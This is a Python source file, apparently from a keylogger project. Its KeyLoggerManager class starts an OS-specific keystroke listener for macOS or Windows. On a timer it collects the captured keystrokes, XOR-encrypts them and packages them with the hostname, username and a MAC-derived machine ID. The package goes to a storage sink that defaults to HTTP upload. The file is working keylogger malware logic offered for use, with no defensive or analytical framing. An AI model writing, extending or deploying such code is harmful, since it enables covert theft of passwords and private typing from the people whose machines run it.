from datetime import datetime
from typing import Dict, Type, Optional
from threading import Timer
import platform
import uuid
import socket
import getpass
from .key_logger_service import KeyLogger, PynputListenerMacOS, PynputListenerWindows
from .data_sink import DataSink, PrintSink, HttpSink, FileSink
from .encryption import Encryption, TestEncryption, XorEncryption
from logger_config import logger
from config import Config


class KeyLoggerManager:
    def __init__(self) -> None:
        """Initialize KeyLoggerManager and set up storage, encryption, and timers."""
        self.computer_name = self.__generate_computer_id()
        logger.info("🔹 Initializing KeyLoggerManager.")
        self.testing_mode = Config.TESTING_MODE
        self.hostname = socket.gethostname()
        self.username = getpass.getuser()

        # Detect operating system and initialize the appropriate keylogger listener
        if platform.system() == "Darwin":
            self.key_logger: KeyLogger = PynputListenerMacOS()
        elif platform.system() == "Windows":
            self.key_logger: KeyLogger = PynputListenerWindows()
        else:
            logger.error(f"❌ Unsupported OS: {platform.system()}")
            raise SystemExit("❌ KeyLoggerManager does not support this OS.")

        # Set up storage method based on configuration
        storage_options: Dict[str, Type[DataSink]] = {
            "print": PrintSink,
            "file": FileSink,
            "http": HttpSink
        }
        storage_class = storage_options.get(Config.STORAGE_TYPE, HttpSink)
        if storage_class is HttpSink:
            logger.warning(f"⚠ Invalid storage type '{Config.STORAGE_TYPE}', defaulting to 'http'.")
        self.storage: DataSink = storage_class()
        logger.debug(f"🔹 Using {Config.STORAGE_TYPE.capitalize()}Sink for storage.")

        # Set up encryption method based on configuration
        encryption_options: Dict[str, Type[Encryption]] = {
            "xor": XorEncryption,
            "test": TestEncryption
        }
        encryption_class = encryption_options.get(Config.ENCRYPTION_TYPE, XorEncryption)
        if encryption_class is XorEncryption:
            logger.warning(f"⚠ Invalid encryption type '{Config.ENCRYPTION_TYPE}', defaulting to 'xor'.")
        self.encryption: Encryption = encryption_class()
        logger.debug(f"🔹 Using {Config.ENCRYPTION_TYPE.capitalize()} encryption.")

        # Additional configuration parameters
        self.status: bool = False
        self.time_for_timer: int = Config.TIMER_INTERVAL
        self.__encryption_timer: Optional[Timer] = None

    def __generate_computer_id(self) -> str:
        """Generate a unique computer identifier based on MAC address."""
        return '_'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 8)])

    def start(self) -> None:
        """Start keylogging and initialize the save timer."""
        logger.info("🔹 Starting key logging.")
        self.key_logger.start()
        self.status = True
        self.__init_save_timer()

    def stop(self) -> None:
        """Stop keylogging and cancel the save timer."""
        logger.info("🔹 Stopping key logging.")
        self.status = False
        self.key_logger.stop()
        if self.__encryption_timer:
            self.__encryption_timer.cancel()
            logger.debug("🔹 Encryption timer canceled.")

    def get_keys(self) -> str:
        """Retrieve all collected keystrokes."""
        logger.debug("🔹 Retrieving logged keys.")
        return self.key_logger.get_all_keys()

    def encrypt_keystrokes(self, data: str) -> str:
        """Encrypt collected keystrokes."""
        logger.debug("🔹 Encrypting keystrokes.")
        return self.encryption.encryption(data)

    def save_to_storage(self, data: dict[str, str]) -> None:
        """Save encrypted data to the selected storage method."""
        logger.debug("🔹 Saving encrypted data to storage.")
        self.storage.storage(data)

    def __init_save_timer(self) -> None:
        """Initialize a timer to periodically collect, encrypt, and store keystrokes."""
        if self.status:
            logger.debug("🔹 Scheduling encryption routine.")
            self.__encryption_timer = Timer(self.time_for_timer, self.__collect_encrypt_and_store)
            self.__encryption_timer.start()

    def __collect_encrypt_and_store(self) -> None:
        """Collect, encrypt, and store keystrokes at scheduled intervals."""
        logger.info("🔹 Collecting, encrypting, and storing keystrokes.")
        raw_data: str = self.get_keys()
        if raw_data:
            encrypted_data: str = self.encrypt_keystrokes(raw_data)
            structured_data: dict[str, str] = self.__prepare_data_payload(encrypted_data)
            self.save_to_storage(structured_data)
        self.__init_save_timer()

    def __prepare_data_payload(self, data: str) -> dict[str, str]:
        """Prepare a structured payload containing encrypted data and metadata."""
        timestamp: str = datetime.now().strftime("%Y-%m-%d %H:%M")
        logger.debug(f"🔹 Preparing data payload with timestamp: {timestamp}")
        return {
            "timestamp": timestamp,
            "encrypted_data": data,
            "computer_name": self.computer_name,
            "hostname": self.hostname,
            "username": self.username
        }
